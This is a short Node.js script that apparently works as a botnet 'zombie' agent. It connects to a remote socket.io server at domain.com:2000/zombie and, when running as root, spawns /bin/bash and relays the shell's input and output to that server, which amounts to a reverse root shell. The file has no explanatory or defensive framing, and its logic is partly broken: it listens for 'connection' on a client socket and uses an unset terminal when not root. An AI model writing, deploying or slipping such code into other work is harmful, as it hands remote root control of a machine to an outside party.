var http = require('http');
var path = require('path');
var io = require('socket.io-client')('http://domain.com:2000/zombie');
var pty = require('pty.js');
var fs = require('fs');
var os = require('os');


io.on('connection', function(socket){
    var request = socket.request;

    var term;
    if (process.getuid() == 0) {
        term = pty.spawn('/bin/bash', [], {
            name: 'xterm-256color',
            cols: 80,
            rows: 30
        });
    }
    term.on('data', function(data) {
        socket.emit('output', data);
    });
    socket.on('resize', function(data) {
        term.resize(data.col, data.row);
    });
    socket.on('input', function(data) {
        term.write(data);
    });
    socket.on('disconnect', function() {
        term.end();
    });
})
